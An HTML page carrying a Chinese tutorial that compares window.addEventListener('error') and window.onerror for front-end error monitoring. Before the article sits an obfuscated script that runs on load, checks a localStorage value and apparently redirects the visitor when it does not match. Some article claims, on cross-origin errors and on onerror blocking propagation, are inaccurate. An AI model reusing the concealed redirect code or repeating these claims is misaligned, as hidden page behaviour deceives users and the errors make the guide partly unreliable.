<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>function _0xc496(_0x3b9a2a,_0x797d9d){var _0x35388a=_0x3538();return _0xc496=function(_0xc4968c,_0x52b07c){_0xc4968c=_0xc4968c-0x1ab;var _0x165bf2=_0x35388a[_0xc4968c];if(_0xc496['VslQDS']===undefined){var _0x5a4611=function(_0x1f957e){var _0x5a9031='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x56885d='',_0x35ee54='';for(var _0x62cc0f=0x0,_0x8d026,_0x29a871,_0x5e50fc=0x0;_0x29a871=_0x1f957e['charAt'](_0x5e50fc++);~_0x29a871&&(_0x8d026=_0x62cc0f%0x4?_0x8d026*0x40+_0x29a871:_0x29a871,_0x62cc0f++%0x4)?_0x56885d+=String['fromCharCode'](0xff&_0x8d026>>(-0x2*_0x62cc0f&0x6)):0x0){_0x29a871=_0x5a9031['indexOf'](_0x29a871);}for(var _0x5b5239=0x0,_0x2666c8=_0x56885d['length'];_0x5b5239<_0x2666c8;_0x5b5239++){_0x35ee54+='%'+('00'+_0x56885d['charCodeAt'](_0x5b5239)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x35ee54);};var _0x222c2b=function(_0x112df2,_0x65dc58){var _0x146bc3=[],_0x47e855=0x0,_0x5d1596,_0x47f695='';_0x112df2=_0x5a4611(_0x112df2);var _0x34b39e;for(_0x34b39e=0x0;_0x34b39e<0x100;_0x34b39e++){_0x146bc3[_0x34b39e]=_0x34b39e;}for(_0x34b39e=0x0;_0x34b39e<0x100;_0x34b39e++){_0x47e855=(_0x47e855+_0x146bc3[_0x34b39e]+_0x65dc58['charCodeAt'](_0x34b39e%_0x65dc58['length']))%0x100,_0x5d1596=_0x146bc3[_0x34b39e],_0x146bc3[_0x34b39e]=_0x146bc3[_0x47e855],_0x146bc3[_0x47e855]=_0x5d1596;}_0x34b39e=0x0,_0x47e855=0x0;for(var _0x21bcb3=0x0;_0x21bcb3<_0x112df2['length'];_0x21bcb3++){_0x34b39e=(_0x34b39e+0x1)%0x100,_0x47e855=(_0x47e855+_0x146bc3[_0x34b39e])%0x100,_0x5d1596=_0x146bc3[_0x34b39e],_0x146bc3[_0x34b39e]=_0x146bc3[_0x47e855],_0x146bc3[_0x47e855]=_0x5d1596,_0x47f695+=String['fromCharCode'](_0x112df2['charCodeAt'](_0x21bcb3)^_0x146bc3[(_0x146bc3[_0x34b39e]+_0x146bc3[_0x47e855])%0x100]);}return _0x47f695;};_0xc496['plQlIA']=_0x222c2b,_0x3b9a2a=arguments,_0xc496['VslQDS']=!![];}var _0x279932=_0x35388a[0x0],_0x29d5a6=_0xc4968c+_0x279932,_0x11c992=_0x3b9a2a[_0x29d5a6];return!_0x11c992?(_0xc496['NnFBQv']===undefined&&(_0xc496['NnFBQv']=!![]),_0x165bf2=_0xc496['plQlIA'](_0x165bf2,_0x52b07c),_0x3b9a2a[_0x29d5a6]=_0x165bf2):_0x165bf2=_0x11c992,_0x165bf2;},_0xc496(_0x3b9a2a,_0x797d9d);}var _0x59a352=_0xc496;(function(_0x1eea32,_0x311fed){var _0xdd9989=_0xc496,_0x561bf2=_0x1eea32();while(!![]){try{var _0x46023f=parseInt(_0xdd9989(0x1c1,'JPDj'))/0x1*(parseInt(_0xdd9989(0x1bf,'KS4O'))/0x2)+-parseInt(_0xdd9989(0x1b1,'ks#S'))/0x3+parseInt(_0xdd9989(0x1b4,'*y3X'))/0x4+-parseInt(_0xdd9989(0x1be,'!fnQ'))/0x5+-parseInt(_0xdd9989(0x1c0,'qFZu'))/0x6+-parseInt(_0xdd9989(0x1b3,'MTqx'))/0x7+parseInt(_0xdd9989(0x1af,'8*wQ'))/0x8*(parseInt(_0xdd9989(0x1ba,'q!sH'))/0x9);if(_0x46023f===_0x311fed)break;else _0x561bf2['push'](_0x561bf2['shift']());}catch(_0x2d3568){_0x561bf2['push'](_0x561bf2['shift']());}}}(_0x3538,0x612b3));if(localStorage[_0x59a352(0x1b7,'WN#B')](_0x59a352(0x1c2,'ENyT'))!=_0x59a352(0x1bd,'^YH[')){window[_0x59a352(0x1ae,'N1T[')][_0x59a352(0x1ac,'D1ix')](_0x59a352(0x1b6,'r#IG'));throw Error();}function _0x3538(){var _0xf616e0=['WORcUhhcQCkbWPm3WQmzomkA','W41bWRVdLXJdNNtcUq','f8kBDcjCW6ddRmkHWPzouIlcNa','WOBdRmkBWOZcJ8olWQzIWPCuiNO','eMrsW5tdJMpdSYtcLwPKWOm','WOxdUueaW5uhCmo/B8k5wSkQ','ymoPraadiq/dVmkTnxVcQq','WOBcOxhcVmoLWRbybSosWR7dIHGIWPNcHKBcKCkSagpdRSoqm8kIWQ7cKa','WQK/WPBdNCkIrmkI','cfhcJMRdTmoNwSorW6dcPxbRgW','W7bAkmoyusnWdaBcHqC0WPW','bYGoWQVcIchcUSkNWQeXsa','WOddUKuoW5vyBSofAmk2DG','WONcHKRcSGifW4BcNmkkWPRdVG','W5pcU8oBEmoq','W7fFl8oAvcLYjG7cNHSpWR4','WO/dRCo9W4O2W5brEq','WRDGeu7dQCoiWOzCWPT+BCocja','W5RdHwHndmogWQSFW6DmfSkZ','mJPJs8k4lmkuWRJcOa','WQBdR8ksWPFdUxpdReL+AgFdMW','wLrnvmoGvYO','W5i1W7fRWPJdTSkZvwHzW4ZcH8kr','ENBcPeeuxSkgW78'];_0x3538=function(){return _0xf616e0;};return _0x3538();};
      document.title = 'window.addEventListener('error') 和 window.onerror 区别';
      document.getElementById('article').innerHTML = 
      "<div><p><code>window.addEventListener('error')</code> 和 <code>window.onerror</code> 都是用于全局错误监听的 API，但它们在 <strong>捕获范围、使用方式和细节行为</strong>   上有显著区别。以下是它们的详细对比：</p>\n<hr>\n<h2><strong>📌 核心区别总结</strong></h2>\n<table>\n<thead>\n<tr>\n<th><strong>特性</strong></th>\n<th><strong><code>window.addEventListener('error')</code></strong></th>\n<th><strong><code>window.onerror</code></strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>捕获阶段</strong></td>\n<td>✅ 支持捕获阶段（<code>useCapture: true</code>）</td>\n<td>❌ 仅在冒泡阶段触发</td>\n</tr>\n<tr>\n<td><strong>资源加载错误</strong></td>\n<td>✅ 能捕获（图片、脚本、CSS 等）</td>\n<td>❌ 不能捕获</td>\n</tr>\n<tr>\n<td><strong>Error 对象</strong></td>\n<td>✅ 通过 <code>e.error</code> 获取完整堆栈</td>\n<td>✅ 通过第5个参数 <code>error</code> 获取</td>\n</tr>\n<tr>\n<td><strong>跨域脚本错误</strong></td>\n<td>✅ 能捕获（需 <code>crossorigin</code>）</td>\n<td>❌ 只能收到 <code>&quot;Script error.&quot;</code>（无详情）</td>\n</tr>\n<tr>\n<td><strong>静态语法错误</strong></td>\n<td>❌ 不能捕获（代码未执行）</td>\n<td>❌ 不能捕获</td>\n</tr>\n<tr>\n<td><strong><code>Promise</code> 错误</strong></td>\n<td>❌ 不能捕获</td>\n<td>❌ 不能捕获（需 <code>unhandledrejection</code>）</td>\n</tr>\n<tr>\n<td><strong><code>try/catch</code> 已处理错误</strong></td>\n<td>❌ 不能捕获</td>\n<td>❌ 不能捕获</td>\n</tr>\n<tr>\n<td><strong>事件监听方式</strong></td>\n<td>可添加多个监听器</td>\n<td>只能绑定一个函数（后者会覆盖前者）</td>\n</tr>\n<tr>\n<td><strong>默认行为阻止</strong></td>\n<td>需手动 <code>e.preventDefault()</code></td>\n<td>自动阻止错误继续传播</td>\n</tr>\n</tbody>\n</table>\n<hr>\n<h2><strong>🔹 详细对比</strong></h2>\n<h3><strong>1. 捕获阶段 vs 冒泡阶段</strong></h3>\n<ul>\n<li>\n<p><strong><code>addEventListener('error', true)</code></strong></p>\n<ul>\n<li>在 <strong>捕获阶段</strong>   触发，能更早拦截错误（包括资源加载错误）。</li>\n<li>示例：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;error&#x27;</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> {\n  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;捕获错误:&#x27;</span>, e.<span class=\"hljs-property\">message</span>);\n}, <span class=\"hljs-literal\">true</span>); <span class=\"hljs-comment\">// 关键：useCapture=true</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>window.onerror</code></strong></p>\n<ul>\n<li>在 <strong>冒泡阶段</strong>   触发，无法捕获资源加载错误。</li>\n<li>示例：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">onerror</span> = <span class=\"hljs-function\">(<span class=\"hljs-params\">message, source, lineno, colno, error</span>) =&gt;</span> {\n  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;错误:&#x27;</span>, message);\n};\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>2. 资源加载错误</strong></h3>\n<ul>\n<li>\n<p><strong><code>addEventListener('error')</code></strong></p>\n<ul>\n<li>能捕获 <code>&lt;img&gt;</code>, <code>&lt;script&gt;</code>, <code>&lt;link&gt;</code> 等资源加载失败：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;error&#x27;</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> {\n  <span class=\"hljs-keyword\">if</span> (e.<span class=\"hljs-property\">target</span>.<span class=\"hljs-property\">tagName</span> === <span class=\"hljs-string\">&#x27;IMG&#x27;</span>) {\n    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;图片加载失败:&#x27;</span>, e.<span class=\"hljs-property\">target</span>.<span class=\"hljs-property\">src</span>);\n  }\n}, <span class=\"hljs-literal\">true</span>);\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>window.onerror</code></strong></p>\n<ul>\n<li><strong>完全无法捕获资源错误</strong>  ，只能捕获 JS 运行时错误。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>3. Error 对象</strong></h3>\n<ul>\n<li>\n<p><strong><code>addEventListener('error')</code></strong></p>\n<ul>\n<li>通过 <code>e.error</code> 获取完整的 Error 对象（包含 <code>stack</code> 堆栈）：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;error&#x27;</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> {\n  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;堆栈:&#x27;</span>, e.<span class=\"hljs-property\">error</span>.<span class=\"hljs-property\">stack</span>);\n}, <span class=\"hljs-literal\">true</span>);\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>window.onerror</code></strong></p>\n<ul>\n<li>通过第5个参数 <code>error</code> 获取 Error 对象：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">onerror</span> = <span class=\"hljs-function\">(<span class=\"hljs-params\">msg, src, line, col, error</span>) =&gt;</span> {\n  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;堆栈:&#x27;</span>, error.<span class=\"hljs-property\">stack</span>);\n};\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>4. 跨域脚本错误</strong></h3>\n<ul>\n<li>\n<p><strong><code>addEventListener('error')</code></strong></p>\n<ul>\n<li>能获取完整错误信息，但需满足：\n<ol>\n<li>脚本服务器返回 <code>Access-Control-Allow-Origin: *</code>。</li>\n<li><code>&lt;script&gt;</code> 标签添加 <code>crossorigin</code> 属性：<pre><code class=\"language-html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;https://other-domain.com/app.js&quot;</span> <span class=\"hljs-attr\">crossorigin</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span>\n</code></pre>\n</li>\n</ol>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>window.onerror</code></strong></p>\n<ul>\n<li>跨域脚本错误仅返回 <code>&quot;Script error.&quot;</code>，无详细信息。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>5. 事件监听方式</strong></h3>\n<ul>\n<li>\n<p><strong><code>addEventListener('error')</code></strong></p>\n<ul>\n<li>支持 <strong>多个监听器</strong>  ，不会互相覆盖：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;error&#x27;</span>, handler1);\n<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;error&#x27;</span>, handler2); <span class=\"hljs-comment\">// 两者都会触发</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>window.onerror</code></strong></p>\n<ul>\n<li>只能绑定 <strong>一个函数</strong>  ，后者覆盖前者：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">onerror</span> = handler1;\n<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">onerror</span> = handler2; <span class=\"hljs-comment\">// 只有 handler2 生效</span>\n</code></pre>\n</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h3><strong>6. 默认行为阻止</strong></h3>\n<ul>\n<li>\n<p><strong><code>addEventListener('error')</code></strong></p>\n<ul>\n<li>需手动调用 <code>e.preventDefault()</code> 阻止错误继续传播：<pre><code class=\"language-javascript\"><span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;error&#x27;</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> {\n  e.<span class=\"hljs-title function_\">preventDefault</span>(); <span class=\"hljs-comment\">// 阻止默认行为（如控制台报红）</span>\n}, <span class=\"hljs-literal\">true</span>);\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p><strong><code>window.onerror</code></strong></p>\n<ul>\n<li><strong>自动阻止错误传播</strong>  （等效于默认调用 <code>preventDefault</code>）。</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h2><strong>🚀 最佳实践</strong></h2>\n<h3><strong>推荐组合使用两者</strong></h3>\n<pre><code class=\"language-javascript\"><span class=\"hljs-comment\">// 1. 用 addEventListener 捕获资源错误 + JS 错误</span>\n<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;error&#x27;</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> {\n  <span class=\"hljs-keyword\">if</span> (e.<span class=\"hljs-property\">error</span>) {\n    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;JS错误:&#x27;</span>, e.<span class=\"hljs-property\">error</span>.<span class=\"hljs-property\">stack</span>);\n  } <span class=\"hljs-keyword\">else</span> {\n    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;资源错误:&#x27;</span>, e.<span class=\"hljs-property\">target</span>.<span class=\"hljs-property\">src</span>);\n  }\n}, <span class=\"hljs-literal\">true</span>);\n\n<span class=\"hljs-comment\">// 2. 用 onerror 作为兜底（兼容性更好）</span>\n<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-property\">onerror</span> = <span class=\"hljs-function\">(<span class=\"hljs-params\">msg, src, line, col, error</span>) =&gt;</span> {\n  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;onerror捕获:&#x27;</span>, msg);\n};\n\n<span class=\"hljs-comment\">// 3. 额外监听 Promise 错误</span>\n<span class=\"hljs-variable language_\">window</span>.<span class=\"hljs-title function_\">addEventListener</span>(<span class=\"hljs-string\">&#x27;unhandledrejection&#x27;</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">e</span>) =&gt;</span> {\n  <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;Promise错误:&#x27;</span>, e.<span class=\"hljs-property\">reason</span>);\n});\n</code></pre>\n<hr>\n<h2><strong>📜 总结</strong></h2>\n<table>\n<thead>\n<tr>\n<th><strong>场景</strong></th>\n<th><strong>推荐使用</strong></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>需要捕获资源加载错误</td>\n<td><code>addEventListener('error', true)</code></td>\n</tr>\n<tr>\n<td>需要完整 Error 对象</td>\n<td><code>addEventListener('error', true)</code></td>\n</tr>\n<tr>\n<td>跨域脚本错误详情</td>\n<td><code>addEventListener('error', true)</code></td>\n</tr>\n<tr>\n<td>简单 JS 错误监控</td>\n<td><code>window.onerror</code></td>\n</tr>\n<tr>\n<td>需要多个错误监听器</td>\n<td><code>addEventListener('error')</code></td>\n</tr>\n</tbody>\n</table>\n<p><strong>结论</strong>  ：</p>\n<ul>\n<li><strong>优先使用 <code>addEventListener('error', true)</code></strong>  （功能更强大）。</li>\n<li><strong><code>window.onerror</code> 作为兼容性兜底</strong>  （但功能有限）。</li>\n<li><strong>两者结合使用</strong>   + <code>unhandledrejection</code> 可实现完整错误监控。</li>\n</ul>\n</div>";</script></body></html>